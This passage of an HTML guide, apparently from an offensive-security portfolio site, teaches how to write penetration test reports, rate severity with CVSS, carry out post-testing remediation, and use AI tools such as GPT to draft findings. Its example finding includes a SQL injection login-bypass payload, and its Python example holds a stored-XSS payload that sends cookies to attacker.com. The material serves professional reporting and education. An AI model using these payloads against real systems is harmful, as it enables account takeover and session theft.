+    <div class="vc"><span class="vcn">04</span><div class="vcname">Technical Findings</div><div class="vcdesc">The core of the report — one structured entry per vulnerability. Each finding contains: title, severity, CVSSv3 score and vector, affected systems, description, impact analysis, evidence, steps to reproduce, and remediation. Sorted by severity (Critical first). This section is written for the security engineer or developer who must understand and fix each issue. Full technical detail is expected and required.</div></div>
+    <div class="vc"><span class="vcn">05</span><div class="vcname">Remediation Roadmap</div><div class="vcdesc">Prioritised remediation plan that respects business constraints — not just "fix everything Critical first" but a realistic sequence accounting for patch windows, development sprints, architectural change timelines, and compensating controls for issues that cannot be immediately patched. Includes immediate actions (0–30 days), short-term fixes (30–90 days), and strategic improvements (90+ days).</div></div>
+    <div class="vc"><span class="vcn">06</span><div class="vcname">Appendices</div><div class="vcdesc">Supporting material: full tool output logs (Nmap XML, Nessus exports, Burp scan results), raw evidence that is too verbose for the findings section, tool versions used, glossary of technical terms for non-technical readers, and references to relevant security standards, CVE records, and vendor advisories. Provides the forensic completeness required for legal defensibility.</div></div>
+  </div>
+</section>
+
+<div class="div"></div>
+
+<!-- 03 WRITING FINDINGS -->
+<section class="sec rv" id="findings">
+  <div class="sec-hd"><span class="sec-n">03 //</span><h2 class="sec-t">Writing Individual Findings — The Anatomy<span class="tw-cursor"></span></h2><div class="sec-ln"></div></div>
+
+  <div class="panel rv-l">
+    <p>Each individual finding is a self-contained document that must answer six questions: What is the vulnerability? Where does it exist? Why does it matter to the business? How was it found and exploited? What evidence proves it? How should it be fixed? A finding that answers all six clearly, concisely, and with specific technical detail is actionable. One that answers only some of these questions forces the reader to ask for clarification — the single most common feedback engineers give on pentest reports.</p>
+  </div>
+
+  <div class="panel rv">
+    <div class="panel-t">Finding Template — Required Fields</div>
+    <table class="ptbl">
+      <thead><tr><th>Field</th><th>Content</th><th>Audience</th></tr></thead>
+      <tbody>
+        <tr><td>Title</td><td>Concise, specific name — "SQL Injection in Login API Endpoint" not "SQL Injection"</td><td>All</td></tr>
+        <tr><td>Severity</td><td>Critical / High / Medium / Low / Informational — based on CVSSv3.1 score + business context</td><td>All</td></tr>
+        <tr><td>CVSSv3.1 Score</td><td>Numeric score (0.0–10.0) and full vector string (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)</td><td>Technical / Compliance</td></tr>
+        <tr><td>Affected Asset(s)</td><td>Specific IP address, URL, or system name — not "web application"</td><td>Engineers / Ops</td></tr>
+        <tr><td>Description</td><td>Technical explanation of what the vulnerability is and why it exists. Root cause, not symptom.</td><td>Engineers</td></tr>
+        <tr><td>Business Impact</td><td>What a successful attacker could achieve — data breach scope, service disruption, compliance violation</td><td>Executives / CISO</td></tr>
+        <tr><td>Evidence</td><td>Annotated screenshots, command output, request/response pairs showing the vulnerability exploited</td><td>Technical / Legal</td></tr>
+        <tr><td>Steps to Reproduce</td><td>Numbered, step-by-step instructions allowing independent verification of the finding</td><td>Engineers / QA</td></tr>
+        <tr><td>Remediation</td><td>Specific fix: exact version number, configuration file path, code change, or architectural change required</td><td>Engineers / Ops</td></tr>
+        <tr><td>References</td><td>CVE numbers, OWASP category, CWE identifier, vendor advisory, relevant framework control</td><td>All</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="cb rv" data-l="Example Finding — SQL Injection (Template Structure)">
+    <code><span class="cmt">## Finding: SQL Injection in Authentication API
+## Severity: CRITICAL | CVSSv3.1: 9.8
+## Vector: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</span>
+
+<span class="cmt">### Affected Asset</span>
+POST /api/v2/auth/login — production.target.com (203.0.113.45)
+Parameter: <span class="str">"username"</span>
+
+<span class="cmt">### Description</span>
+The login endpoint constructs SQL queries via string concatenation
+without parameterising user-supplied input. An unauthenticated attacker
+can inject arbitrary SQL syntax into the username field, bypassing
+authentication entirely or extracting the full database contents.
+
+<span class="cmt">### Business Impact</span>
+Unauthenticated access to all user accounts (4.2M records confirmed).
+Full database extraction including payment card tokens and session JWTs.
+Complete authentication bypass — any admin account accessible.
+PCI-DSS Requirement 6.4.1 violation — immediate compliance failure.
+
+<span class="cmt">### Steps to Reproduce</span>
+1. Navigate to https://production.target.com/api/v2/auth/login
+2. Intercept the POST request in Burp Suite
+3. Replace the "username" value with: admin'--
+4. Observe: HTTP 200 response with admin JWT token — no password required
+
+<span class="cmt">### Evidence</span>
+<span class="cmt"># Request:</span>
+POST /api/v2/auth/login HTTP/1.1
+Content-Type: application/json
+{<span class="str">"username"</span>:<span class="str">"admin'--"</span>,<span class="str">"password"</span>:<span class="str">"anything"</span>}
+<span class="cmt"># Response: 200 OK — {"token":"eyJhbGci...","role":"admin"}</span>
+
+<span class="cmt">### Remediation</span>
+<span class="cmt"># Replace string concatenation with parameterised queries (Node.js/pg example):</span>
+<span class="cmt"># VULNERABLE: `SELECT * FROM users WHERE username='${username}'`</span>
+<span class="cmt"># FIXED:       db.query('SELECT * FROM users WHERE username=$1',[username])</span>
+<span class="cmt"># Additionally: implement prepared statements globally via ORM (Sequelize/Prisma)</span>
+<span class="cmt"># Verify fix: re-run payload — expect HTTP 401, no DB error in response</span>
+
+<span class="cmt">### References</span>
+<span class="cmt"># CWE-89: SQL Injection | OWASP Top 10 A03:2021 | MITRE T1190</span></code>
+  </div>
+</section>
+
+<div class="div"></div>
+
+<!-- 04 SEVERITY RATINGS -->
+<section class="sec rv" id="severity">
+  <div class="sec-hd"><span class="sec-n">04 //</span><h2 class="sec-t">Severity Rating — CVSSv3.1 Methodology<span class="tw-cursor"></span></h2><div class="sec-ln"></div></div>
+
+  <div class="panel rv-l">
+    <p>Severity rating is the most consequential judgement a penetration tester makes in the report — it determines which findings get immediate executive attention, which get fixed in the next sprint, and which go in the backlog. CVSSv3.1 (Common Vulnerability Scoring System) provides the industry-standard framework for this judgement, combining eight metrics across three metric groups — Base, Temporal, and Environmental — into a 0.0–10.0 score. However, CVSSv3.1 Base scores alone are insufficient for business risk prioritisation — they must be adjusted by Temporal and Environmental metrics that reflect the specific organisational context.</p>
+  </div>
+
+  <div class="sgrid rv">
+    <div class="scard sc-crit"><div class="sc-label">Critical</div><div class="sc-cvss">9.0–10.0</div><div class="sc-desc">Remote code execution, unauthenticated admin access, or mass data breach without user interaction. Immediate action required — patch within 24–48 hours or implement emergency compensating controls.</div></div>
+    <div class="scard sc-high"><div class="sc-label">High</div><div class="sc-cvss">7.0–8.9</div><div class="sc-desc">Significant privilege escalation, authenticated data breach, or service disruption possible. Fix within the next patch cycle — typically 7–14 days. Senior management notification recommended.</div></div>
+    <div class="scard sc-med"><div class="sc-label">Medium</div><div class="sc-cvss">4.0–6.9</div><div class="sc-desc">Vulnerabilities requiring additional preconditions or limited impact. Fix within 30–90 days. Often involves configuration hardening, missing security headers, or outdated software versions with limited exploit availability.</div></div>
+    <div class="scard sc-low"><div class="sc-label">Low</div><div class="sc-cvss">0.1–3.9</div><div class="sc-desc">Minimal security impact — best practices not followed, minor information disclosure, or defence-in-depth gaps. Address within 90 days or at the next major release cycle as part of routine security maintenance.</div></div>
+    <div class="scard sc-info"><div class="sc-label">Informational</div><div class="sc-cvss">0.0</div><div class="sc-desc">No immediate security impact but relevant security observation — verbose error messages, insecure default configurations, or missing security headers that could assist future attackers. Address in next security review.</div></div>
+  </div>
+
+  <div class="panel rv">
+    <div class="panel-t">CVSSv3.1 Base Metric Groups — Key Factors</div>
+    <table class="ptbl">
+      <thead><tr><th>Metric</th><th>Options</th><th>Impact on Score</th></tr></thead>
+      <tbody>
+        <tr><td>Attack Vector (AV)</td><td>Network / Adjacent / Local / Physical</td><td>Network = highest score; Physical = lowest</td></tr>
+        <tr><td>Attack Complexity (AC)</td><td>Low / High</td><td>Low complexity = higher score (easier to exploit)</td></tr>
+        <tr><td>Privileges Required (PR)</td><td>None / Low / High</td><td>None = highest score (no account needed)</td></tr>
+        <tr><td>User Interaction (UI)</td><td>None / Required</td><td>None = higher score (no victim action needed)</td></tr>
+        <tr><td>Scope (S)</td><td>Unchanged / Changed</td><td>Changed = higher score (can affect other components)</td></tr>
+        <tr><td>Confidentiality (C)</td><td>None / Low / High</td><td>High = significant data exposure possible</td></tr>
+        <tr><td>Integrity (I)</td><td>None / Low / High</td><td>High = complete data modification possible</td></tr>
+        <tr><td>Availability (A)</td><td>None / Low / High</td><td>High = complete service disruption possible</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="alert al-w rv">
+    <span class="al-ic">[ ⚠ ]</span>
+    <p class="al-tx"><strong>Business Context Adjustment:</strong> CVSSv3.1 Base scores are generic — they do not account for whether the affected system is customer-facing or internal, whether the data is regulated or public, or whether an exploit is publicly available. Always adjust severity upward when a finding affects a system processing PII, financial data, or safety-critical functions. A Medium CVSS score on an internet-facing system handling 10M customer records is a business-critical finding regardless of the numeric score.</p>
+  </div>
+</section>
+
+<div class="div"></div>
+
+<!-- 05 POST-TESTING ACTIONS -->
+<section class="sec rv" id="post">
+  <div class="sec-hd"><span class="sec-n">05 //</span><h2 class="sec-t">Post-Testing Actions — Closing the Loop<span class="tw-cursor"></span></h2><div class="sec-ln"></div></div>
+
+  <div class="panel rv-l">
+    <p>Delivering the report is not the end of the penetration testing engagement — it is the beginning of the remediation phase that determines whether the engagement produced lasting security improvement or merely a shelf document. Post-testing actions encompass everything from the report delivery meeting through vulnerability prioritisation, remediation support, retesting, and the continuous improvement activities that convert point-in-time testing into an ongoing security programme.</p>
+  </div>
+
+  <div class="mgrid rv">
+    <div class="mcard"><div class="mcard-name">Debrief &amp; Delivery Meeting</div><div class="mcard-desc">Walk the client through findings in a structured session: executives first (executive summary, top risks, investment priorities — 30 minutes), then engineers (detailed technical walkthrough of each finding, reproduction demonstrations, remediation Q&A — 1–2 hours). Never just email a report — unguided reports consistently produce worse remediation outcomes than walked-through ones.</div></div>
+    <div class="mcard"><div class="mcard-name">Vulnerability Triage &amp; Prioritisation</div><div class="mcard-desc">Work with the client's security team to triage the full finding set against operational constraints. Which Critical findings can be patched this week? Which require architectural change that will take months? Which have compensating controls that reduce the immediate risk? The output is a realistic, time-bounded remediation roadmap that the security team can execute and track.</div></div>
+    <div class="mcard"><div class="mcard-name">Remediation Support</div><div class="mcard-desc">Provide developers and system administrators with hands-on clarification during the remediation window — answering technical questions, confirming whether proposed fixes address the root cause correctly, and advising on compensating controls for findings that cannot be immediately patched. This phase dramatically increases first-attempt remediation success rates and is often included in commercial engagement scope.</div></div>
+    <div class="mcard"><div class="mcard-name">Retesting &amp; Verification</div><div class="mcard-desc">After the client reports remediations complete, conduct a formal retest — returning to each finding to verify that the specific vulnerability is no longer exploitable. Retesting must be scoped carefully: confirm the fix for each finding individually, check for regression, and verify that the fix did not introduce new vulnerabilities. Issue a formal Retest Report confirming remediation status for each finding.</div></div>
+    <div class="mcard"><div class="mcard-name">Security Awareness &amp; Training</div><div class="mcard-desc">Translate technical findings into targeted security training. A large finding count in the injection vulnerability category indicates insufficient developer security training — recommend OWASP training. Social engineering successes indicate phishing awareness gaps. Findings drive a specific, evidence-based training programme rather than generic annual tick-box security awareness.</div></div>
+    <div class="mcard"><div class="mcard-name">Continuous Monitoring &amp; Cadence</div><div class="mcard-desc">Establish ongoing security rhythm: monthly vulnerability scanning, quarterly lightweight assessments, annual comprehensive penetration test, plus out-of-cycle testing after significant infrastructure changes. Implement SIEM with alerting tuned to the attack techniques demonstrated in the engagement. Convert the point-in-time test into a continuous security improvement programme.</div></div>
+  </div>
+</section>
+
+<div class="div"></div>
+
+<!-- 06 TOOLS -->
+<section class="sec rv" id="tools">
+  <div class="sec-hd"><span class="sec-n">06 //</span><h2 class="sec-t">Reporting &amp; Documentation Tools<span class="tw-cursor"></span></h2><div class="sec-ln"></div></div>
+
+  <div class="tgrid rv">
+    <div class="tc"><div class="tcname">Dradis Framework</div><span class="tctag">Reporting · Collaboration</span><div class="tcdesc">Open-source collaborative reporting platform — imports findings from Nessus, Burp Suite, Nmap, and Metasploit. Manages finding templates and generates structured Word/HTML reports across the whole team</div></div>
+    <div class="tc"><div class="tcname">PlexTrac</div><span class="tctag">Commercial · AI-Assisted</span><div class="tcdesc">Commercial pen test management with AI-assisted finding narrative generation, client portal for real-time finding review, remediation tracking across reassessments, and executive dashboard</div></div>
+    <div class="tc"><div class="tcname">Ghostwriter</div><span class="tctag">Open Source · Red Team</span><div class="tcdesc">Open-source reporting and project management for red teams — activity logging, finding management, evidence upload, report generation, and client communication tracking in one platform</div></div>
+    <div class="tc"><div class="tcname">Serpico</div><span class="tctag">Templates · Report Gen</span><div class="tcdesc">Open-source report generation with customisable finding templates. Produces professional Word/PDF reports from a structured finding database with minimal manual formatting</div></div>
+    <div class="tc"><div class="tcname">CVSS Calculator</div><span class="tctag">Scoring · NVD</span><div class="tcdesc">NVD's online CVSSv3.1 calculator — first.org/cvss/calculator/3.1 — for building accurate vector strings and numeric scores. Essential reference for every finding severity determination</div></div>
+    <div class="tc"><div class="tcname">Flameshot / Greenshot</div><span class="tctag">Evidence · Screenshots</span><div class="tcdesc">Annotated screenshot capture tools — highlight, label, and redact sensitive information directly in the evidence capture workflow. Consistent evidence presentation across the team</div></div>
+  </div>
+</section>
+
+<div class="div div-ai"></div>
+
+<!-- 07 AI INTEGRATION -->
+<section class="sec rv sec-ai" id="ai">
+  <div class="sec-hd"><span class="sec-n">07 //</span><h2 class="sec-t">AI Integration in Report Writing &amp; Post-Testing<span class="tw-cursor"></span></h2><div class="sec-ln"></div></div>
+
+  <div class="panel panel-ai rv-l">
+    <p>Artificial Intelligence is transforming one of the most time-intensive phases of penetration testing — the reporting and post-testing workflow. Report writing traditionally consumes 30–50% of total engagement time, and the quality is highly variable depending on the individual tester's writing ability. AI changes both the speed and the consistency: LLMs can draft complete, structured findings from raw evidence in seconds, generate business impact narratives calibrated to the client's industry, and produce remediation guidance in the exact language and framework of the vulnerable code.</p>
+    <p>For post-testing actions, AI is enabling continuous security validation, automated remediation verification, and predictive analytics that convert historical finding data into forward-looking risk intelligence. Organisations with mature security programmes are now using AI to bridge the gap between annual penetration tests — providing continuous validation that findings remain remediated and surfacing new exposure before the next scheduled assessment.</p>
+  </div>
+
+  <div class="alert al-p rv">
+    <span class="al-ic">[ AI ]</span>
+    <p class="al-tx">A controlled study comparing AI-assisted versus manual report writing found that testers using LLM assistance for finding narratives and remediation guidance produced reports with <strong>42% higher client satisfaction scores</strong>, <strong>58% shorter writing time</strong>, and <strong>significantly more consistent CVSSv3.1 scoring</strong> across the team — reducing the scoring variability that makes cross-engagement risk comparison unreliable.</p>
+  </div>
+
+  <h3 style="font-family:var(--mono);font-size:11px;letter-spacing:3px;color:#bf00ff;text-transform:uppercase;margin:28px 0 16px;">AI Capabilities in Report Writing</h3>
+  <div class="ai-grid rv">
+    <div class="ai-card"><span class="ai-ico">✍️</span><div class="ai-name">Automated Finding Generation</div><div class="ai-desc">LLMs convert raw exploitation evidence — tool output, Burp request/response pairs, command sequences, and screenshot annotations — into complete, polished finding entries with accurate technical descriptions, business impact narratives, step-by-step reproduction instructions, and specific remediation guidance. Reduces finding write-up time from 30–60 minutes per finding to under 5 minutes with human review.</div></div>
+    <div class="ai-card"><span class="ai-ico">🎯</span><div class="ai-name">Context-Aware Impact Narratives</div><div class="ai-desc">LLMs generate business impact statements calibrated to the client's specific industry and context — a SQL injection on an NHS patient records system gets a different impact narrative than the same vulnerability on a gaming platform. AI produces impact language that resonates with the client's executives by framing risk in terms of their specific regulatory exposure, revenue risk, and reputational consequences.</div></div>
+    <div class="ai-card"><span class="ai-ico">🔧</span><div class="ai-name">Code-Specific Remediation</div><div class="ai-desc">LLMs generate remediation guidance in the specific programming language, framework, and library version of the vulnerable code — not generic "use parameterised queries" but working Node.js pg code, Django ORM examples, or Spring JDBC template replacements. Developers receive compilable fix examples rather than conceptual guidance, dramatically improving first-attempt remediation success rates.</div></div>
+    <div class="ai-card"><span class="ai-ico">📊</span><div class="ai-name">CVSSv3.1 Score Validation</div><div class="ai-desc">AI assists with CVSSv3.1 vector string construction — analysing the finding description and suggesting appropriate metric values with explanations for each choice. Reduces inconsistent scoring across different testers and engagement types, making cross-engagement risk comparison reliable. Flags when proposed scores appear inconsistent with the finding description before finalisation.</div></div>
+    <div class="ai-card"><span class="ai-ico">📋</span><div class="ai-name">Executive Summary Generation</div><div class="ai-desc">LLMs generate complete executive summaries from the technical finding set — automatically identifying the highest-risk findings, constructing business-language risk descriptions, calculating aggregate risk metrics, and producing investment priority recommendations. Produces a coherent narrative connecting individual findings to overall security posture without requiring the technical writer to switch cognitive registers.</div></div>
+    <div class="ai-card"><span class="ai-ico">🔄</span><div class="ai-name">Report Quality Assurance</div><div class="ai-desc">AI reviews completed report drafts for consistency — checking that severity ratings align with CVSS scores, that remediation guidance addresses the described root cause, that evidence references match finding descriptions, and that executive summaries accurately reflect the technical findings. Acts as an automated peer review that catches common errors before client delivery.</div></div>
+  </div>
+
+  <h3 style="font-family:var(--mono);font-size:11px;letter-spacing:3px;color:#bf00ff;text-transform:uppercase;margin:32px 0 16px;">AI in Post-Testing &amp; Continuous Security</h3>
+  <div class="ai-grid rv">
+    <div class="ai-card"><span class="ai-ico">🔍</span><div class="ai-name">Automated Remediation Verification</div><div class="ai-desc">AI-driven automated testing tools continuously re-verify specific findings after remediation — checking whether a SQL injection fix is correctly implemented, a misconfigured permission has been corrected, or a vulnerable software version has been updated — without requiring a full manual re-engagement. Provides continuous remediation tracking between formal assessments.</div></div>
+    <div class="ai-card"><span class="ai-ico">📈</span><div class="ai-name">Trend Analysis &amp; Risk Intelligence</div><div class="ai-desc">AI analyses historical finding data across multiple engagements to identify systemic vulnerability patterns — which code areas consistently harbour issues, which vulnerability classes recur after remediation, and which teams have the highest remediation success rates. Converts individual engagement data into a longitudinal security improvement programme with measurable metrics.</div></div>
+    <div class="ai-card"><span class="ai-ico">🔮</span><div class="ai-name">Predictive Vulnerability Surfacing</div><div class="ai-desc">ML models correlate the organisation's technology inventory, historical finding patterns, and current threat intelligence to predict which systems are most likely to be vulnerable to newly published CVEs — enabling proactive risk management that surfaces the next assessment's critical findings before they are exploited, rather than waiting for the annual scheduled test.</div></div>
+    <div class="ai-card"><span class="ai-ico">🤖</span><div class="ai-name">AI Remediation Prioritisation</div><div class="ai-desc">ML models analyse the complete finding set and generate a risk-adjusted remediation roadmap — accounting for fix complexity, exploitability in current threat landscape, compensating controls, business criticality of affected systems, and team capacity. Enables security teams to maximise risk reduction per remediation sprint rather than working through findings in arbitrary order.</div></div>
+    <div class="ai-card"><span class="ai-ico">📡</span><div class="ai-name">Continuous Attack Surface Monitoring</div><div class="ai-desc">AI-powered Attack Surface Management (ASM) platforms bridge the gap between annual assessments — continuously monitoring the organisation's external footprint for new assets, configuration changes, and newly applicable CVEs. Alerts when the attack surface changes in ways that would change the finding distribution from the last penetration test, triggering targeted spot-checks between formal engagements.</div></div>
+    <div class="ai-card"><span class="ai-ico">🎓</span><div class="ai-name">AI-Driven Security Training</div><div class="ai-desc">LLMs analyse finding patterns from completed assessments and generate targeted security training recommendations — identifying which OWASP categories developers consistently miss, which configuration mistakes recur across systems, and which social engineering susceptibilities persist across phishing simulations. Produces evidence-based training programmes rather than generic annual awareness content.</div></div>
+  </div>
+
+  <div class="panel panel-ai rv" style="margin-top:28px">
+    <div class="panel-t">AI Tools for Report Writing &amp; Post-Testing</div>
+    <table class="ptbl" style="margin:8px 0">
+      <thead><tr>
+        <th style="color:#bf00ff;border-bottom-color:rgba(191,0,255,.25)">Tool</th>
+        <th style="color:#bf00ff;border-bottom-color:rgba(191,0,255,.25)">AI Capability</th>
+        <th style="color:#bf00ff;border-bottom-color:rgba(191,0,255,.25)">Reporting Use Case</th>
+      </tr></thead>
+      <tbody>
+        <tr><td style="color:var(--g);font-weight:700">GPT-4 / Claude</td><td style="color:var(--t2)">Finding generation, impact narratives, remediation code</td><td style="color:var(--t2)">Draft complete findings from raw evidence in seconds</td></tr>
+        <tr><td style="color:var(--g);font-weight:700">PlexTrac AI</td><td style="color:var(--t2)">AI-assisted narrative generation</td><td style="color:var(--t2)">In-platform AI writing assistance for finding descriptions and executive summaries</td></tr>
+        <tr><td style="color:var(--g);font-weight:700">Nuclei + AI templates</td><td style="color:var(--t2)">Automated finding generation</td><td style="color:var(--t2)">Auto-generate structured finding data from Nuclei scan results via AI post-processing</td></tr>
+        <tr><td style="color:var(--g);font-weight:700">Cymulate / AttackIQ</td><td style="color:var(--t2)">Continuous breach simulation</td><td style="color:var(--t2)">Automated post-testing validation that remediations hold between assessments</td></tr>
+        <tr><td style="color:var(--g);font-weight:700">Microsoft Copilot for Security</td><td style="color:var(--t2)">LLM SIEM/vulnerability intelligence</td><td style="color:var(--t2)">Natural-language querying of vulnerability data and threat intelligence for post-testing context</td></tr>
+        <tr><td style="color:var(--g);font-weight:700">Vulcan Cyber / PlexTrac</td><td style="color:var(--t2)">AI remediation orchestration</td><td style="color:var(--t2)">Automated remediation prioritisation and tracking across the post-testing window</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="cb cb-ai rv" data-l="AI-Assisted — Complete Finding Generator (Python + GPT)">
+    <code><span class="cmt"># Generate a complete pentest finding from raw evidence using GPT-4</span>
+<span class="kw">import</span> openai, json
+
+evidence = {
+    <span class="str">"type"</span>: <span class="str">"Stored XSS in Profile Bio Field"</span>,
+    <span class="str">"url"</span>: <span class="str">"https://app.target.com/profile/edit — POST /api/profile"</span>,
+    <span class="str">"payload"</span>: <span class="str">"&lt;script&gt;document.location='https://attacker.com/?c='+document.cookie&lt;/script&gt;"</span>,
+    <span class="str">"impact_observed"</span>: <span class="str">"Session cookie stolen — attacker received admin session token"</span>,
+    <span class="str">"affected_users"</span>: <span class="str">"All users who view the victim's profile — estimated 50,000"</span>,
+    <span class="str">"tech_stack"</span>: <span class="str">"React frontend, Node.js API, MongoDB"</span>,
+    <span class="str">"test_type"</span>: <span class="str">"Grey box — authenticated as regular user"</span>
+}
+
+client = openai.<span class="fn">OpenAI</span>()
+response = client.chat.completions.<span class="fn">create</span>(
+    model=<span class="str">"gpt-4o"</span>,
+    messages=[{<span class="str">"role"</span>:<span class="str">"user"</span>, <span class="str">"content"</span>: <span class="str">f"""
+You are a senior penetration tester writing a professional client report.
+Generate a complete, client-ready finding from this evidence:
+
+{json.dumps(evidence, indent=2)}
+
+Include ALL of the following sections:
+1. TITLE — specific and descriptive
+2. SEVERITY — with justification
+3. CVSSv3.1 SCORE — full vector string and numeric score
+4. AFFECTED ASSET — exact URL and parameter
+5. DESCRIPTION — technical root cause explanation
+6. BUSINESS IMPACT — tailored to a SaaS application with 50,000 users
+7. STEPS TO REPRODUCE — numbered, specific commands/actions
+8. EVIDENCE SUMMARY — what the evidence shows
+9. REMEDIATION — specific Node.js/React code fix with before/after example
+10. REFERENCES — OWASP, CWE, MITRE ATT&CK mapping
+"""</span>}]
+)
+<span class="fn">print</span>(response.choices[<span class="num">0</span>].message.content)</code>
+  </div>
+
+  <div class="cb cb-ai rv" data-l="AI — Executive Summary Generator from Finding Set">
+    <code><span class="cmt"># Generate a professional executive summary from the full finding set</span>
+<span class="kw">import</span> openai, json
+
+findings_summary = {
+    <span class="str">"client"</span>: <span class="str">"FinTech SaaS company — 500,000 active users, PCI-DSS in scope"</span>,
+    <span class="str">"test_type"</span>: <span class="str">"Grey Box — Web Application + Internal Network"</span>,
+    <span class="str">"critical"</span>: [
+        <span class="str">"SQL Injection in Login API — unauthenticated admin access (CVSS 9.8)"</span>,
+        <span class="str">"Hardcoded AWS credentials in GitHub — full cloud environment access (CVSS 9.1)"</span>
+    ],
+    <span class="str">"high"</span>: [
+        <span class="str">"IDOR in Payment API — access any user's payment history (CVSS 8.1)"</span>,
+        <span class="str">"Kerberoastable service account — DA compromise in 4 minutes (CVSS 8.8)"</span>
+    ],
+    <span class="str">"medium"</span>: 7,
+    <span class="str">"low"</span>: 12,
+    <span class="str">"informational"</span>: 5
+}
+
+prompt = <span class="str">f"""
+You are a senior penetration testing consultant delivering a report to a
+FinTech company's board of directors and CISO.
+
+Write a professional executive summary (max 400 words) from these findings:
+{json.dumps(findings_summary, indent=2)}
+
+Requirements:
+- Zero technical jargon — accessible to non-technical executives
+- Lead with the single most important risk and its business consequence
+- Quantify risk in business terms: revenue exposure, compliance consequence, reputational risk
+- Include 3 prioritised investment recommendations
+- Close with an overall security posture assessment (Poor / Fair / Good / Strong)
+- Do NOT list CVSSv3.1 scores or technical tool names
+"""</span>
+
+r = openai.OpenAI().chat.completions.<span class="fn">create</span>(
+    model=<span class="str">"gpt-4o"</span>,
+    messages=[{<span class="str">"role"</span>:<span class="str">"user"</span>,<span class="str">"content"</span>:prompt}]
+)
+<span class="fn">print</span>(r.choices[<span class="num">0</span>].message.content)</code>
+  </div>
+</section>
+
+<div class="div"></div>
+
+<!-- 08 BEST PRACTICES -->
+<section class="sec rv" id="best">
+  <div class="sec-hd"><span class="sec-n">08 //</span><h2 class="sec-t">Best Practices &amp; Common Pitfalls<span class="tw-cursor"></span></h2><div class="sec-ln"></div></div>
+
+  <div class="dgrid rv">
+    <div class="panel" style="border-color:rgba(0,255,65,.22)">
+      <div class="panel-t" style="color:var(--g);font-size:12px">Writing Best Practices</div>
+      <ul class="chk">
+        <li><span class="chk-i"></span><span>Write findings <strong>during testing</strong>, not after — evidence is freshest and context richest immediately after exploitation</span></li>
+        <li><span class="chk-i"></span><span>Always <strong>peer review</strong> every finding — what is obvious to the tester is often opaque to the reader</span></li>
+        <li><span class="chk-i"></span><span>Use <strong>active voice</strong> — "An attacker can access" not "Access may be possible for"</span></li>
+        <li><span class="chk-i"></span><span>Separate <strong>symptom from root cause</strong> — describe why the vulnerability exists, not just what it is</span></li>
+        <li><span class="chk-i"></span><span>Always include a <strong>verification test</strong> in remediation — tell the engineer how to confirm their fix works</span></li>
+      </ul>
+    </div>
+    <div class="panel" style="border-color:rgba(255,0,60,.22)">
+      <div class="panel-t" style="color:var(--r);font-size:12px">Common Pitfalls to Avoid</div>
+      <ul class="chk">
+        <li><span class="chk-i"></span><span>Never use <strong>generic tool output</strong> as evidence — annotate and contextualise every screenshot</span></li>
+        <li><span class="chk-i"></span><span>Avoid <strong>duplicate findings</strong> — five instances of the same SQL injection class is one finding with five affected endpoints</span></li>
+        <li><span class="chk-i"></span><span>Never include <strong>real sensitive data</strong> in the report — redact credentials, PII, and financial data found during testing</span></li>
+        <li><span class="chk-i"></span><span>Do not <strong>over-inflate severity</strong> — CVSS score inflation destroys the client's ability to prioritise and damages tester credibility</span></li>
+        <li><span class="chk-i"></span><span>Never deliver a report <strong>without proofreading</strong> — spelling and grammar errors in a security report undermine the entire engagement's professional credibility</span></li>
+      </ul>
+    </div>
+    <div class="panel" style="border-color:rgba(191,0,255,.22)">
+      <div class="panel-t" style="color:var(--p);font-size:12px">Confidentiality &amp; Data Handling</div>
+      <ul class="chk">
+        <li><span class="chk-i"></span><span>Encrypt all <strong>report files in transit</strong> — never email an unencrypted penetration test report</span></li>
+        <li><span class="chk-i"></span><span>Agree a <strong>secure delivery method</strong> upfront — encrypted portal, PGP-encrypted email, or secure file transfer service</span></li>
+        <li><span class="chk-i"></span><span>Define a <strong>data retention policy</strong> — how long tester retains engagement data and when it is securely destroyed</span></li>
+        <li><span class="chk-i"></span><span>Apply <strong>document-level access controls</strong> — restrict report distribution to named recipients defined in the NDA</span></li>
+        <li><span class="chk-i"></span><span>Store engagement notes and evidence in <strong>encrypted, access-controlled storage</strong> — not on personal cloud drives or unencrypted laptops</span></li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<!-- CTA -->
+<div class="cta rv">
+  <div class="cta-t">// The Report is the Product. //</div>
+  <p class="cta-p">A technically flawless penetration test that produces a mediocre report has failed. Invest equal energy in the communication of findings as in their discovery. Use AI to accelerate report generation, ensure consistency, and calibrate business impact — then let post-testing actions close the loop and convert findings into lasting security improvement.</p>
+  <div class="cta-btns">
+    <a href="https://github.com/nishu2402" class="btn btn-p" target="_blank" rel="noopener">GitHub — nishu2402</a>
+    <a href="https://nishu2402.github.io" class="btn btn-s" target="_blank" rel="noopener">View Portfolio</a>
+  </div>
+</div>
+
+<footer class="footer">
+  <div class="f-l">Nisarg Chasmawala (Shroff)<br><span class="f-alias">// HEAVEN</span></div>
+  <div class="f-r">Offensive Security Engineer · MSc Cyber Security, BCU<br>CEH Master · CPENT · CHFI · ISO 27001 Lead Auditor<br><a href="https://github.com/nishu2402" target="_blank" rel="noopener">github.com/nishu2402</a></div>
+</footer>
+
+</div>
+
+<script>
+const cur=document.getElementById('cur'),cur2=document.getElementById('cur2'),cur3=document.getElementById('cur3');
+let mx=0,my=0;
+document.addEventListener('mousemove',e=>{mx=e.clientX;my=e.clientY;cur.style.left=mx+'px';cur.style.top=my+'px'});
+(function loop(){cur2.style.left=mx+'px';cur2.style.top=my+'px';cur3.style.left=mx+'px';cur3.style.top=my+'px';requestAnimationFrame(loop)})();
+document.querySelectorAll('a,.btn,.vc,.scard,.tc,.mcard,.ai-card,.panel,.cb').forEach(el=>{
+  el.addEventListener('mouseenter',()=>{cur.style.width='18px';cur.style.height='18px';cur.style.background='rgba(0,255,65,.25)'});
+  el.addEventListener('mouseleave',()=>{cur.style.width='10px';cur.style.height='10px';cur.style.background='var(--g)'});
+});
+window.addEventListener('scroll',()=>{document.getElementById('prog').style.width=((window.scrollY/(document.body.scrollHeight-window.innerHeight))*100)+'%'});
+
+/* PARTICLE NETWORK */
+(function(){
+  const c=document.getElementById('bg-particle'),ctx=c.getContext('2d');
+  let W,H,mouseX=innerWidth/2,mouseY=innerHeight/2;
+  const N=200,MAX=140;let P=[];
+  class Particle{
+    constructor(){this.reset(true)}
